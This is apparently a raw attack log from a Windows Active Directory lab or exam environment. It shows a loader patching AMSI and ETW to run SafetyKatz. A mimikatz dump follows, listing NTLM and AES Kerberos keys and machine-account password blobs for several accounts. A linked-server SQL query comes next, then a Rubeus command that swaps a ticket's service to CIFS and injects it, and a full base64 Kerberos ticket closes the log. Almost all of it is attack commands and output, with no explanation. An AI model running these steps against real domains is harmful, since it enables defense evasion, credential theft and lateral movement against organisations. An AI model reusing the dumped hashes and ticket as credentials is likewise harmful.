
C:\temp\Loader.exe -path C:/SafetyKatz.exe
[*] Applying amsi patch: true
[*] Applying etw patch: true
[*] Decrypting packed exe...
[!] ~Flangvik - Arno0x0x Edition - #NetLoader
[+] Patched!
[+] Starting C:/SafetyKatz.exe with args ''
[!] Damn, it failed, too bad
[!] Could not find file 'C:\SafetyKatz.exe'.

C:\Windows\system32>C:\temp\Loader.exe -path C:\temp\SafetyKatz.exe
[*] Applying amsi patch: true
[*] Applying etw patch: true
[*] Decrypting packed exe...
[!] ~Flangvik - Arno0x0x Edition - #NetLoader
[+] Patched!
[+] Starting C:\temp\SafetyKatz.exe with args ''

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # -path
ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz(commandline) # C:\temp\SafetyKatz.exe
ERROR mimikatz_doLocal ; "C:\temp\SafetyKatz.exe" command of "standard" module not found !

Module :        standard
Full name :     Standard module
Description :   Basic commands (does not require module name)

            exit  -  Quit mimikatz
             cls  -  Clear screen (doesn't work with redirections, like PsExec)
          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
          coffee  -  Please, make me a coffee!
           sleep  -  Sleep an amount of milliseconds
             log  -  Log mimikatz input/output to file
          base64  -  Switch file input/output base64
         version  -  Display some version informations
              cd  -  Change or display current directory
       localtime  -  Displays system local date and time (OJ command)
        hostname  -  Displays system local hostname

mimikatz # sekurlsa::ekeys

Authentication Id : 0 ; 2033927 (00000000:001f0907)
Session           : RemoteInteractive from 3
User Name         : studentuser
Domain            : CITADEL
Logon Server      : CITADEL-DC
Logon Time        : 3/31/2025 12:59:34 AM
SID               : S-1-5-21-253487801-221673152-1815095224-1113

         * Username : studentuser
         * Domain   : CITADEL.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       858b10ed88344b82235700aa68cf29400819085255b23e210894c894ebfa366c
           rc4_hmac_nt       48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_old      48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_md4           48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_nt_exp   48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_old_exp  48b6f3d4deb15bb3107d0c9d175eb2a4

Authentication Id : 0 ; 2033830 (00000000:001f08a6)
Session           : RemoteInteractive from 3
User Name         : studentuser
Domain            : CITADEL
Logon Server      : CITADEL-DC
Logon Time        : 3/31/2025 12:59:34 AM
SID               : S-1-5-21-253487801-221673152-1815095224-1113

         * Username : studentuser
         * Domain   : CITADEL.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       858b10ed88344b82235700aa68cf29400819085255b23e210894c894ebfa366c
           rc4_hmac_nt       48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_old      48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_md4           48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_nt_exp   48b6f3d4deb15bb3107d0c9d175eb2a4
           rc4_hmac_old_exp  48b6f3d4deb15bb3107d0c9d175eb2a4

Authentication Id : 0 ; 2022967 (00000000:001ede37)
Session           : Interactive from 3
User Name         : UMFD-3
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/31/2025 12:59:33 AM
SID               : S-1-5-96-0-3

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 81191 (00000000:00013d27)
Session           : Service from 0
User Name         : sharemanager
Domain            : CITADEL
Logon Server      : CITADEL-DC
Logon Time        : 3/30/2025 11:40:56 PM
SID               : S-1-5-21-253487801-221673152-1815095224-1109

         * Username : sharemanager
         * Domain   : CITADEL.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       96a6ee62bbe3e8515aa892bada5652a729fd76406f462b0fea472fb77f1476ba
           rc4_hmac_nt       ad1b41d88cfd57b08f0fb50b1eee2541
           rc4_hmac_old      ad1b41d88cfd57b08f0fb50b1eee2541
           rc4_md4           ad1b41d88cfd57b08f0fb50b1eee2541
           rc4_hmac_nt_exp   ad1b41d88cfd57b08f0fb50b1eee2541
           rc4_hmac_old_exp  ad1b41d88cfd57b08f0fb50b1eee2541

Authentication Id : 0 ; 39107 (00000000:000098c3)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:54 PM
SID               : S-1-5-90-0-1

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : EXAMVM$
Domain            : CITADEL
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:53 PM
SID               : S-1-5-20

         * Username : examvm$
         * Domain   : CITADEL.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       2a12f46bf431b0364d42189c30174a943037fbc9e63e15bd6686d5bddc0790fd
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 2024114 (00000000:001ee2b2)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2025 12:59:33 AM
SID               : S-1-5-90-0-3

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 2023715 (00000000:001ee123)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/31/2025 12:59:33 AM
SID               : S-1-5-90-0-3

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 38986 (00000000:0000984a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:54 PM
SID               : S-1-5-90-0-1

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 21642 (00000000:0000548a)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:53 PM
SID               : S-1-5-96-0-1

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 21626 (00000000:0000547a)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:53 PM
SID               : S-1-5-96-0-0

         * Username : EXAMVM$
         * Domain   : citadel.corp
         * Password : 6d 81 33 35 a8 af 7f 2b ba d9 5f 5a 0a 27 99 03 70 8a 34 14 54 a1 1a 56 77 c2 71 22 76 d0 f3 b0 e1 b7 24 e9 f0 22 01 54 b5 ee f2 46 af 7f d1 48 5c 07 ae 84 5d 16 09 44 59 c9 19 23 f2 a5 1c 2d 6f 78 5d f0 3c 7f 4e ad 38 e6 cc 5e c1 d2 e3 69 9e 54 ac 52 e0 bb 8f ba 1c 33 fa cb 34 5a 87 f4 0a d3 20 b9 c9 11 bf 5f 32 fc 17 63 63 0a d7 4a cf 8a d0 7b 98 a1 97 3e c6 6e db db 01 98 5f e9 a9 78 36 1d 68 86 d3 9a 53 7f e5 0c da e7 d4 63 39 3b 11 74 14 6d 44 2b b7 ee 72 9d 92 27 19 65 09 fe 3b 13 c7 6e 18 63 c6 90 1d 2d f8 c0 b0 35 58 fa f4 1f 3d 25 39 5f 64 63 a8 99 00 5a d6 ac ca bb f3 74 2a c2 44 b5 cb 0c 43 36 53 bd f4 5d 1d 1f 69 61 2b d5 5b c9 0c 0c e7 dd 45 11 03 0c ff da 90 cc 1a 1d 8a d7 38 19 99 e8 f7 74 44 6e
         * Key List :
           aes256_hmac       f61c544bf31e8e03b60c27502419ef720047207fc2b0f4df632985292c29a2ba
           aes128_hmac       10d13c587d27a1998a19422ba2fd83d5
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : EXAMVM$
Domain            : CITADEL
Logon Server      : (null)
Logon Time        : 3/30/2025 11:40:53 PM
SID               : S-1-5-18

         * Username : examvm$
         * Domain   : CITADEL.CORP
         * Password : (null)
         * Key List :
           aes256_hmac       2a12f46bf431b0364d42189c30174a943037fbc9e63e15bd6686d5bddc0790fd
           rc4_hmac_nt       f60944395e0ade01695295da58cbc41f
           rc4_hmac_old      f60944395e0ade01695295da58cbc41f
           rc4_md4           f60944395e0ade01695295da58cbc41f
           rc4_hmac_nt_exp   f60944395e0ade01695295da58cbc41f
           rc4_hmac_old_exp  f60944395e0ade01695295da58cbc41f

mimikatz # exit
Bye!




Import-Module SqlServer
EXECUTE (
SELECT name AS [sqlsrv3DB],
  DATABASEPROPERTY(name, N'Issqlsrv3') AS [sqlsrv3],
  DATABASEPROPERTY(name, N'IsOffline') AS [Offline],
  DATABASEPROPERTY(name, N'IsEmergencyMode') AS [Emergency],
  has_dbaccess(name) AS [HasDBAccess]
FROM sysdatabases
WHERE (DATABASEPROPERTY(name, N'Issqlsrv3') = 1)
   OR (DATABASEPROPERTY(name, N'IsOffline') = 1)
   OR (DATABASEPROPERTY(name, N'IsEmergencyMode') = 1)
   OR (has_dbaccess(name) = 0)
   ) AT SQLSRV3
GO



.\Rubeus.exe tgssub /ticket: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 /altservice:cifs /ptt



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